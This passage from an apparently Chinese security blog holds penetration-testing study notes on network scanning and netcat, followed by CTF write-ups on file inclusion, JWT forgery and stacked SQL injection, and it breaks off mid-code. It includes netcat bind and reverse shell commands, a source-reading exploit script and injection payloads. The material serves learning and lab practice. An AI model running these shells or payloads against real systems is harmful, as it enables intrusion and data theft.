（在本网段下发送的arp，在外网发送的icmp数据包，同样也会有DNS解析，另外还有TCP包）</li><li>nmap -iL iplist.txt -sn</li></ul><h5 id="fping"><a href="#fping" class="headerlink" title="fping"></a>fping</h5><p>​        比ping命令用法更丰富，可以对地址段进行ping，ping响应的内容也更多</p><ul><li>fping 1.1.1.1 -c 1</li><li>fping  -g  1.1.1.0  1.1.1.255</li><li>fping -g  1.1.1.0/24</li><li>fping -f iplist.txt</li></ul><h5 id="Hping3"><a href="#Hping3" class="headerlink" title="Hping3"></a>Hping3</h5><p>​        几乎可以实现对包内容的每一个字段的自定义，类似scapy</p><ul><li>Hping<ul><li>能够发送几乎任意TCP/IP包</li><li>功能强大但每次只能扫描一个目标</li></ul></li><li>hping3  1.1.1.1   —icmp  -c  2</li><li>脚本方式实现：<ul><li>for addr  in  $(seq 1 254) : do hping3   1.1.1.$addr  —icmp -c 1 &gt;&gt;handle.txt &amp; done</li></ul></li></ul><h4 id="发现——四层发现"><a href="#发现——四层发现" class="headerlink" title="发现——四层发现"></a>发现——四层发现</h4><p>​        此处只在于发现ip，不在于发现端口</p><ul><li>优点<ul><li>可路由且结果可靠</li><li>不太可能被防火墙过滤</li><li>甚至可以发现所有端口都被过滤的主机</li></ul></li><li>缺点<ul><li>基于状态过滤的防火墙可能过滤扫描</li><li>全端口扫描速度慢</li></ul></li><li>TCP<ul><li>未经请求的ACK——RST（直接发第三阶段的ACK，服务器拒绝贸然发来的ack直接回应RST包，这样证明了该主机存活）</li><li>SYN——SYN/ACK、RST （正常的请求过程）</li></ul></li><li>UDP<ul><li>ICMP端口不可达、一去不复返</li></ul></li></ul><p>通过scapy构造实现（略）</p><h5 id="nmap-2"><a href="#nmap-2" class="headerlink" title="nmap"></a>nmap</h5><ul><li>nmap  1.1.1.1-254  -PU53  -sn</li><li>nmap  1.1.1.1-254  -PA80   -sn    直接发ACK包</li><li>nmap  -iL iplist.txt  -PA80  -sn</li></ul><p>只做主机发现，不做端口扫描</p><h5 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h5><ul><li>hping3  —udp  1.1.1.1  -c 1  返回ICMP端口不可达即证明主机存活  （UDP准确度不是很高）</li></ul><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><h4 id="UDP端口扫描"><a href="#UDP端口扫描" class="headerlink" title="UDP端口扫描"></a>UDP端口扫描</h4><ul><li>端口对应网络服务及应用端程序</li><li>服务端程序的漏洞通过端口攻入</li><li>发现开放的端口</li><li>更具体地攻击面</li></ul><ul><li>UDP端口扫描<ul><li>假设ICMP  port unreachable  响应代表端口关闭</li><li>目标系统不响应ICMP port unreachable时则端口开放（与主机发现相反，可能产生误判）</li></ul></li><li>完整的UDP应用层请求<ul><li>准确性高</li><li>耗时巨大</li></ul></li></ul><h5 id="nmap-3"><a href="#nmap-3" class="headerlink" title="nmap"></a>nmap</h5><ul><li>nmap -sU 1.1.1.1<ul><li>默认的1000个端口</li><li>ICMP host-unreachable （基于UDP就是基于这个特征来探测）</li></ul></li><li>nmap -sU 192.168.1.134  -p1-65535   或者    -p-</li><li>nmap  -iL  iplist.txt  -sU  -p  1-200</li></ul><h4 id="TCP端口扫描"><a href="#TCP端口扫描" class="headerlink" title="TCP端口扫描"></a>TCP端口扫描</h4><ul><li>基于连接的协议</li><li>三次握手</li><li>隐蔽扫描</li><li>僵尸扫描</li><li>全连接扫描</li><li>所有的TCP扫描方式都是基于三次握手的变化来判断目标端口状态</li></ul><p><img src="渗透测试学习笔记-信息收集/4.png" alt=""></p><h5 id="隐蔽扫描——syn"><a href="#隐蔽扫描——syn" class="headerlink" title="隐蔽扫描——syn"></a>隐蔽扫描——syn</h5><ul><li>不建立完整连接</li><li>应用日志不记录扫描行为——隐蔽</li></ul><p>（应用层日志由于没建立连接所以不会有记录，网络层进行深度审计还是可以发现）</p><ul><li>nmap 192.168.1.134  -p1-100  默认按syn扫描  （加—open  只显示扫描出来的open的端口）</li><li>nmap -sS 1.1.1.1  -p 80,21,25    （按syn扫描）</li><li>hping3  1.1.1.1  —scan 80 -S</li></ul><h5 id="僵尸扫描"><a href="#僵尸扫描" class="headerlink" title="僵尸扫描"></a>僵尸扫描</h5><ul><li>极其隐蔽</li><li>实施条件苛刻</li><li>可伪造源地址</li><li>选择僵尸机<ul><li>闲置系统（足够空闲，没有其他主机与它通信）</li><li>系统使用递增的IPID<ul><li>0</li><li>随机</li></ul></li></ul></li></ul><p><img src="渗透测试学习笔记-信息收集/5.png" alt=""></p><p>（第三步如果扫描者接到的RST包IPID=x+2则可以判断之前伪造的扫描请求端口是开放的，否则不开放的情况下IPID=x+1）</p><ul><li>查询是否能充当一个好的僵尸机<ul><li>nmap -p445 192.168.1.133 —script=ipidseq.nse</li></ul></li><li>扫描目标<ul><li>nmap 192.168.1.134  -sI  【僵尸机ip（在同一个网络里别人的主机）】   -Pn -p 0-100</li></ul></li></ul><h4 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h4><ul><li>识别开放端口上运行的应用</li><li>识别目标操作系统</li><li>提高攻击效率<ul><li>Banner捕获</li><li>服务识别</li><li>操作系统识别</li><li>SNMP分析</li><li>SMB扫描</li><li>防火墙识别</li></ul></li></ul><h5 id="Banner"><a href="#Banner" class="headerlink" title="Banner"></a>Banner</h5><ul><li>软件开发商</li><li>软件名称</li><li>服务类型</li><li>版本号<ul><li>直接发现已知的漏洞和弱点</li></ul></li><li>连接建立后直接获取banner（不可避免留下连接痕迹）</li></ul><p><strong>eg:  nc -nv 1.1.1.1 22</strong></p><p>eg: 简单的一些函数测试（略）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#python socket 控制台下</span><br><span class="line">import socket</span><br><span class="line">banner &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">banner.connect((&quot;192.168.1.134&quot;,21))</span><br><span class="line">banner.recv(4096)</span><br><span class="line">banner.close()</span><br><span class="line">exit()</span><br><span class="line"># 某些应用软件的banner不允许抓取，recv函数无返回将挂起</span><br></pre></td></tr></table></figure><p>nmap扩展：/usr/share/nmap/scripts   自带了许多nmap脚本（lua语言编写</p><p>ls | grep  ms-sql</p><p><strong>eg: amap   -B  192.168.1.133  1-445  </strong></p><h5 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h5><ul><li>另类服务识别方法（banner提供的信息有限）<ul><li>特征行为和响应字段</li><li>不同的响应可用于识别底层操作系统</li></ul></li></ul><p><strong>eg: nmap 192.168.1.134  -p1-100  -sV  识别端口服务（不仅仅基于banner，还会基于指纹特征等）</strong></p><p><strong>eg: amap 192.168.35.1 20-30  -qb</strong></p><h5 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a>操作系统识别</h5><ul><li>操作系统识别技术<ul><li>种类繁多</li><li>好产品采用多种技术组合</li></ul></li><li>TTL起始值<ul><li>Windows：128（65-128）</li><li>Linux/Unix：64（1-64）</li><li>某些Unix：255</li></ul></li></ul><p><strong>eg：nmap 1.1.1.1  -O</strong></p><p><strong>eg：xprobe2  192.168.1.134</strong>   （不太准）</p><ul><li><p>被动操作系统识别</p><ul><li>IDS</li><li>抓包分析</li></ul><p><strong>eg：p0f（自动监听流量并识别os）</strong></p></li></ul><h5 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h5><ul><li>简单网络管理协议</li><li>信息的金矿</li><li>Community strings（snmp的身份验证）</li><li>信息查询或重新配置</li><li>经常被错误配置</li><li>public / private / manager</li><li><strong>MIB tree</strong><ul><li>SNMP Management Information  Base (MIB)</li><li>树型的网络设备管理功能数据库</li><li>1.3.6.1.4.1.77.1.2.25</li></ul></li><li>onesixtyone  1.1.1.1  public</li><li>onesixtyone  -c  dict.txt  -i hosts  -o  my.log  -w 100</li><li>snmpwalk  hosts  -c public  -v  2c</li></ul><h5 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a>SMB扫描</h5><ul><li>Server Message Block 协议<ul><li>微软历史上出现安全问题最多的协议</li><li>实现复杂</li><li>默认开放</li><li>文件共享</li><li>空会话未身份认证访问（SMB1）<ul><li>密码策略</li><li>用户名</li><li>组名</li><li>机器名</li><li>用户、组ID</li></ul></li></ul></li><li>nmap -v -p135,445  192.168.60.1-20</li><li>nmap  192.168.1.132 -p139,445  —script=smb-os-discovery.nse</li><li>nmap -v -p139,445  —script=smb-check-vulns  —script-args=unsafe=1  1.1.1.1</li><li>nbtscan -r 192.168.1.0/24（nbtscan局域网下可以跨网段扫描）</li></ul><h5 id="SMTP扫描"><a href="#SMTP扫描" class="headerlink" title="SMTP扫描"></a>SMTP扫描</h5><ul><li>发现邮箱账号</li><li>nmap  smtp.163.com  -p25  —script=smtp-enum-users.nse   —script-args=smtp-enum-users.methods={VRFY}</li></ul><h5 id="防火墙扫描"><a href="#防火墙扫描" class="headerlink" title="防火墙扫描"></a>防火墙扫描</h5><ul><li>通过检查回包，可能识别端口是否经过防火墙过滤</li><li>设备多种多样，结果存在一定误差</li></ul><p><img src="渗透测试学习笔记-信息收集/6.png" alt=""></p><h5 id="负载均衡识别"><a href="#负载均衡识别" class="headerlink" title="负载均衡识别"></a>负载均衡识别</h5><ul><li>广域负载均衡<ul><li>DNS</li></ul></li><li>HTTP-load balancing<ul><li>Nginx</li><li>Apache</li></ul></li><li>lbd www.baidu.com</li><li>lbd mail.163.com</li></ul><h5 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h5><ul><li>WEB应用防火墙</li><li>wafw00f  -l</li><li>wafw00f <a href="http://www.microsoft.com" target="_blank" rel="noopener">http://www.microsoft.com</a></li><li>nmap www.microsoft.com —script=http-waf-detect.nse</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试学习笔记-Kali工具介绍(2)</title>
      <link href="/2019/09/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Kali%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D-2/"/>
      <url>/2019/09/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Kali%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D-2/</url>
      
        <content type="html"><![CDATA[<h1 id="Kali工具介绍"><a href="#Kali工具介绍" class="headerlink" title="Kali工具介绍"></a>Kali工具介绍</h1><h2 id="NETCAT——NC"><a href="#NETCAT——NC" class="headerlink" title="NETCAT——NC"></a>NETCAT——NC</h2><ul><li>网络工具中的瑞士军刀</li><li>侦听模式/传输模式</li><li>取代telnet/获取banner信息</li><li>传输文本信息</li><li>传输文件/目录</li><li>加密传输文件</li><li>远程控制/木马</li><li>加密流量（默认不加密）</li><li>流媒体服务器</li><li>远程克隆硬盘</li></ul><p>nc -nv 1.1.1.1 80</p><p>nc -l -p 4444  监听端口（服务器端）      nc -nv 1.1.1.1 4444 连接端口（客户端） （只支持双方，第三方再去连接会被refuse）</p><p>ls -l | nc -nv 1.1.1.1 333</p><p>ps aux | nc -nv 1.1.1.1 333  -q  1</p><h3 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h3><p>nc -lp 333 &gt; 1.mp4</p><p>nc -nv 1.1.1.1  333 &lt; 2.mp4   -q  1</p><p>或</p><p>nc  -q  1 -lp 333  &lt; a.mp4</p><p>nc -nv 1.1.1.1 333 &gt; 2.mp4</p><h3 id="传输目录"><a href="#传输目录" class="headerlink" title="传输目录"></a>传输目录</h3><p>tar -cvf - music/  | nc -lp 333 -q 1</p><p>nc -nv 1.1.1.1 333 | tar -xvf - </p><p>（也可以用文件重定向的方式）</p><h3 id="加密传文件"><a href="#加密传文件" class="headerlink" title="加密传文件"></a>加密传文件</h3><p>nc -lp 333 | mcrypt —flush -Fbqd -a rijndael -256 -m ecb &gt; 1.mp4 </p><p>mcrypt —flush -Fbq -a rijndael -256 -m ecb &lt; a.pm4  | nc -nv 1.1.1.1 333  -q  1</p><p>（使用其它任意加密工具都可以，nc本身不能加密）</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nc -nvz  1.1.1.1  1-65535</p><p>nc -nvzu  1.1.1.1  1-1024   （UDP mode）</p><h3 id="远程克隆硬盘"><a href="#远程克隆硬盘" class="headerlink" title="远程克隆硬盘"></a>远程克隆硬盘</h3><p>（备份/远程电子取证,可以将目标服务器硬盘远程复制，或者内存）</p><p>nc  -lp 333  |  dd  of =/dev/sdb</p><p>dd if=/dev/sda  | nc -nv 1.1.1.1 333 -q 1</p><h3 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h3><p>正向：</p><p>nc -lp 333  -c bash   （eg: -c bash  or  -c  /bin/sh）</p><p>nc 1.1.1.1 333</p><p>反向：</p><p>nc -lp 333</p><p>nc 1.1.1.1 333 -c bash</p><p>（windows下把bash换成cmd）</p><h3 id="NC缺点"><a href="#NC缺点" class="headerlink" title="NC缺点"></a>NC缺点</h3><ul><li>缺乏加密</li><li>缺乏访问控制</li><li>不同操作系统对nc的版本不同，相应指令也不同</li></ul><h2 id="Ncat"><a href="#Ncat" class="headerlink" title="Ncat"></a>Ncat</h2><p>为了弥补nc的缺乏加密、缺乏访问控制而开发出来的工具。 Ncat包含于nmap工具包中</p><p>ncat -c bash —allow 192.168.23.130  -vnl  333  —ssl</p><p>ncat  -nv  192.168.23.136 333  —ssl</p><h2 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h2><p>抓包引擎</p><ul><li>Libpcap9——Linux</li><li>Winpcap10——Windows</li></ul><p>解码能力：衡量一个抓包器的优良的重要指标</p><p>（对各种协议的分析解码能力）</p><p>非混杂模式：凡是不是发给本机IP地址（选定的网卡对应的IP地址）的包是不会抓取的</p><p>混杂模式：经过网卡的所有流量都会嗅探到</p><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p>过滤规则—略</p><h3 id="常见协议包"><a href="#常见协议包" class="headerlink" title="常见协议包"></a>常见协议包</h3><p>略</p><h3 id="信息统计"><a href="#信息统计" class="headerlink" title="信息统计"></a>信息统计</h3><p>Statistics 中的一些选项用于处理统计数据包信息 </p><h3 id="解码方式"><a href="#解码方式" class="headerlink" title="解码方式"></a>解码方式</h3><p>wireshark默认根据端口来选择解码方式，但是对于一个端口上跑的服务可能改变，此时需要右键数据包 Decode As…</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试学习笔记-渗透测试简介(1)</title>
      <link href="/2019/09/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AE%80%E4%BB%8B-1/"/>
      <url>/2019/09/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AE%80%E4%BB%8B-1/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试简介"><a href="#渗透测试简介" class="headerlink" title="渗透测试简介"></a>渗透测试简介</h1><p><strong>前言</strong>：该系列为学习渗透测试-安全牛所做学习记录..</p><h2 id="安全问题的根源"><a href="#安全问题的根源" class="headerlink" title="安全问题的根源"></a>安全问题的根源</h2><ul><li>分层思想的优劣</li><li>只追求功能实现</li><li>最大的威胁是人</li></ul><h2 id="安全目标"><a href="#安全目标" class="headerlink" title="安全目标"></a>安全目标</h2><p><strong>先于攻击者发现和防止漏洞出现</strong></p><ul><li>攻击型安全 （渗透测试）</li><li>防护型安全  关闭端口、服务等降低攻击面（缺点在于容易忽视，投入太大效果很脆弱）</li></ul><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><ul><li>尝试挫败安全防御机制，发现系统安全弱点</li><li>从攻击者的角度思考，测量安全防护有效性</li><li>证明安全问题的存在，而非破坏</li><li>道德约束</li><li>法律</li></ul><h2 id="渗透测试标准"><a href="#渗透测试标准" class="headerlink" title="渗透测试标准"></a>渗透测试标准</h2><ul><li>PETS（渗透测试标准）</li><li>前期交互阶段 （确定渗透测试范围，渗透方式）</li><li>情报收集阶段   （主动/被动信息收集）</li><li>威胁建模阶段</li><li>漏洞分析阶段</li><li>渗透攻击阶段</li><li>后渗透测试阶段</li><li>渗透测试报告</li></ul><h2 id="渗透测试项目"><a href="#渗透测试项目" class="headerlink" title="渗透测试项目"></a>渗透测试项目</h2><ul><li>渗透测试范围</li><li>获得授权</li><li>渗透测试方法<ul><li>是否允许社会工程学</li><li>是否允许拒绝服务攻击</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>n1ctf-2018-web</title>
      <link href="/2019/09/03/n1ctf-2018-eatingcms/"/>
      <url>/2019/09/03/n1ctf-2018-eatingcms/</url>
      
        <content type="html"><![CDATA[<h1 id="n1ctf-2018-eatingcms"><a href="#n1ctf-2018-eatingcms" class="headerlink" title="n1ctf-2018-eatingcms"></a>n1ctf-2018-eatingcms</h1><p>拿到题目一个登录界面，首先是先测注入。尝试了一下发现基本都过滤了，无果。</p><p>御剑扫一下目录扫出了一个register.php，发现可以注册账号，随便注册了一个账号登录进去。</p><p>进去看了半天没有思路，退出来尝试注册界面的注册发现也没用，想过以管理员注册也没有用。</p><p>（百度查了一下思路..竟然是page处存在文件包含…果然是太年轻了..根本没注意到这个点，其实想一想开发角度可以理解）</p><p><a href="http://47.112.16.34:22231/user.php?page=guest" target="_blank" rel="noopener">http://47.112.16.34:22231/user.php?page=guest</a></p><p>把page换成php://filter去读取源码</p><p>顺手写了一个脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Python3</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;47.112.16.34:22231&#x2F;user.php?page&#x3D;&quot;</span><br><span class="line">payload &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#123;&#125;&quot;</span><br><span class="line">headers&#x3D;&#123;</span><br><span class="line">&#39;User-Agent&#39;: &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;65.0.3325.181 Safari&#x2F;537.36&quot;,</span><br><span class="line">&#39;Cookie&#39;:&quot;PHPSESSID&#x3D;l9mlo2iht6fpo2lkmubof4udv6&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def output(filename,results):</span><br><span class="line">    with open(filename,&#39;w&#39;) as f:</span><br><span class="line">        f.write(results)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getsource(new_url,line):</span><br><span class="line">    print(new_url)</span><br><span class="line">    response &#x3D; requests.get(new_url,headers&#x3D;headers)</span><br><span class="line">    print (base64.b64decode(response.text).decode(encoding&#x3D;&quot;utf-8&quot;))</span><br><span class="line">    results &#x3D; base64.b64decode(response.text).decode(encoding&#x3D;&quot;utf-8&quot;)</span><br><span class="line">    output(line,results)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    with open(&#39;字典.txt&#39;,&#39;r&#39;) as f:</span><br><span class="line">        while True:</span><br><span class="line">            line &#x3D; f.readline()[:-1] #去除\n</span><br><span class="line">            print(line)</span><br><span class="line">            if line:</span><br><span class="line">                new_url &#x3D; (url+payload).format(line)</span><br><span class="line">                getsource(new_url,line)</span><br><span class="line">            else:</span><br><span class="line">                break</span><br></pre></td></tr></table></figure><p>cookie和字典自己构造换一下（字典给当前目录下的就好，拿/去写的路径字典没处理）</p><p>在function.php中找到关键词</p><p><strong>$keywords = [“flag”,”manage”,”ffffllllaaaaggg”];</strong></p><p>既然不让看这几个就说明肯定有猫腻</p><p>看到parse_url，之前做过一个题绕过parse_url即可加一堆斜杠造成其解析错误绕过</p><p><img src="n1ctf-2018-eatingcms/Snipaste_2019-07-01_19-32-24.png" alt=""></p><p>进而找到</p><p><a href="http://47.112.16.34:22231//////user.php?page=m4aaannngggeee" target="_blank" rel="noopener">http://47.112.16.34:22231//////user.php?page=m4aaannngggeee</a></p><p>在此我们发现一个上传路径。随手传了一张图片发现跳转到</p><p><a href="http://47.112.16.34:22231//////upllloadddd.php" target="_blank" rel="noopener">http://47.112.16.34:22231//////upllloadddd.php</a></p><p>于是拿到upllloadddd.php的源码</p><p><img src="n1ctf-2018-eatingcms/Snipaste_2019-07-01_18-51-44.png" alt=""></p><p>发现其中有system，是个命令注入绕过</p><p><img src="n1ctf-2018-eatingcms/Snipaste_2019-07-01_19-00-16.png" alt=""></p><p>ls发现由于后面的管道把内容加密成了base64，解码发现ls执行成功，即这个注入不存在什么绕过点，唯一优化一点就是把后面的base64绕过不用自己去解码。</p><p><img src="n1ctf-2018-eatingcms/Snipaste_2019-07-01_19-09-31.png" alt=""></p><p>输出空串作用于管道可以绕过。</p><p>最后flag在父目录下</p><p><img src="n1ctf-2018-eatingcms/Snipaste_2019-07-01_19-17-33.png" alt=""></p><p>总结一下这个题的考点：</p><ul><li>敏感参数测试出文件包含</li><li>文件包含利用php://filter读取源码</li><li>用一堆斜杠造成parse_url的解析错误利用</li><li>命令注入（绕过管道）</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018CSAW-SSO</title>
      <link href="/2019/09/03/2018CSAW-SSO/"/>
      <url>/2019/09/03/2018CSAW-SSO/</url>
      
        <content type="html"><![CDATA[<h1 id="SSO"><a href="#SSO" class="headerlink" title="SSO"></a>SSO</h1><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>题目描述：<br>Don’t you love undocumented APIs<br>Be the admin you were always meant to be</p><p>进入题目发现提示：</p><p>Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!</p><p>考点在于oauth2.0</p><p>这里放上一篇博客详解OAuth 2.0 <a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html</a></p><p>通过查看源代码可以知道题目大概的意思：</p><ul><li>考点在于OAuth 2.0的 客户端”授权码”授权模式</li><li>先在/oauth2/authorize处 用户给予授权，认证服务器将用户导向客户端事先指定的”重定向URI”（redirection URI），同时附上一个授权码。</li><li>客户端接收到授权码，在/oauth2/token处 向认证服务器申请令牌</li><li>认证服务器核对了授权码和重定向URI，确认无误后向用户发送令牌-token</li><li>用户拿着令牌去访问/protected 下的flag</li></ul><p>授权模式大致流程（来源网络）</p><p><strong>获取Authorization Code，通常访问/authorize</strong></p><p>请求的参数：</p><ul><li>response_type：表示授权类型，必选项，此处的值固定为”code”</li><li>client_id：表示客户端的ID，必选项</li><li>redirect_uri：表示重定向URI，可选项</li><li>scope：表示申请的权限范围，可选项</li><li>state：表示客户端的当前状态，可以指定任意值，认证 <a href="http://www.codercto.com/category/server.html" target="_blank" rel="noopener">服务器</a> 会原封不动地返回这个值。</li></ul><p><strong>获取Access Token，通常访问/token</strong></p><p>请求的参数：</p><ul><li>grant_type：表示使用的授权模式，必选项，此处的值固定为”authorization_code”。</li><li>code：表示上一步获得的授权码，必选项。</li><li>redirect_uri：表示重定向URI，必选项，且必须与A步骤中的该参数值保持一致。</li><li>client_id：表示客户端ID，必选项。</li></ul><p><strong>访问限制资源，比如这里的/protected</strong></p><p>根据流程我们来构造相应数据包：</p><p><img src="2018CSAW-SSO/1.png" alt=""></p><p>首先拿到code，这里重定向到我们自己vps</p><p><img src="2018CSAW-SSO/2.png" alt=""></p><p>jwt——json web token  我们解码可以看到关于code的信息</p><p><img src="2018CSAW-SSO/3.png" alt=""></p><p>我们收到了重定向的包，拿到了code，接下来去申请令牌</p><p><img src="2018CSAW-SSO/4.png" alt=""></p><p>post的参数有如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant_type：表示使用的授权模式，必选项，此处的值固定为&quot;authorization_code&quot;。</span><br><span class="line">code：表示上一步获得的授权码，必选项。</span><br><span class="line">redirect_uri：表示重定向URI，必选项，且必须与A步骤中的该参数值保持一致。</span><br><span class="line">client_id：表示客户端ID，必选项。</span><br></pre></td></tr></table></figure><p>拿到令牌后需要以该token去访问限制目录</p><p><img src="2018CSAW-SSO/7.png" alt=""></p><p>可以发现直接去访问会提示必须以admin去访问，我们在token中的解密得到的jwt的信息如下：（另外一个jwt在线加解密网站 <a href="https://jwt.io/）" target="_blank" rel="noopener">https://jwt.io/）</a></p><p><img src="2018CSAW-SSO/5.png" alt=""></p><p>可以猜测type这里需要我们修改成admin，同时secret为敏感信息，猜测这是需要hash验证的密码。</p><p><img src="2018CSAW-SSO/9.png" alt=""></p><p>在这里进行hash验证后得到的jwt作为token值去访问/protected</p><p><img src="2018CSAW-SSO/8.png" alt=""></p><p>得到flag。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>熟悉OAuth 2.0的流程</li><li>vps监听重定向包</li><li>post包的构造（新接触了postman…emmm还不是很会用）</li><li>之前一直回显错误</li></ol><p><img src="2018CSAW-SSO/6.png" alt=""></p><p>以为是token的type类型改admin导致的错误，其实是没有hash256去验证。hash的payload猜测来自token中的敏感信息。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -OAuth </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019强网杯-随便注</title>
      <link href="/2019/09/02/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
      <url>/2019/09/02/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>​        这是来自2019强网杯的一道注入题。</p><p><img src="2019强网杯-随便注/1.png" alt=""></p><p>inject=1’ and sleep(3) —+ 发现可以执行延时，难道可以直接盲注? 直接上sqlmap</p><p><img src="2019强网杯-随便注/2.png" alt=""></p><p>可以跑出来库名，但是跑不出表名，手动测试发现过滤了关键字。</p><p><img src="C:/Users/TPH/Desktop/Web%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0/BUUCTF/3.png" alt=""></p><p>即不用select注入。并且大小写无法绕过，想到用拼接的方式构造select，这里测试发现能够执行多语句。</p><p><img src="2019强网杯-随便注/4.png" alt=""></p><p>于是可以用预编译的方式来执行一个变量语句，而这个变量语句可以通过字符串连接构造出select</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set @sql&#x3D;concat(&#39;sel&#39;,&#39;ect * from &#96;1919810931114514&#96;&#39;);</span><br><span class="line">prepare presql from @sql;</span><br><span class="line">execute presql;</span><br><span class="line">deallocate prepare presql;</span><br></pre></td></tr></table></figure><p><img src="2019强网杯-随便注/5.png" alt=""></p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p><strong>Mysql预编译</strong></p><ul><li><p>编译</p><ul><li><code>PREPARE stmt_name FROM preparable_stm</code>——预编译一条语句</li></ul></li><li><p>执行</p><ul><li><p><code>EXECUTE stmt_name [USING @var_name [, @var_name] ...]</code></p><p><em>eg</em>：</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 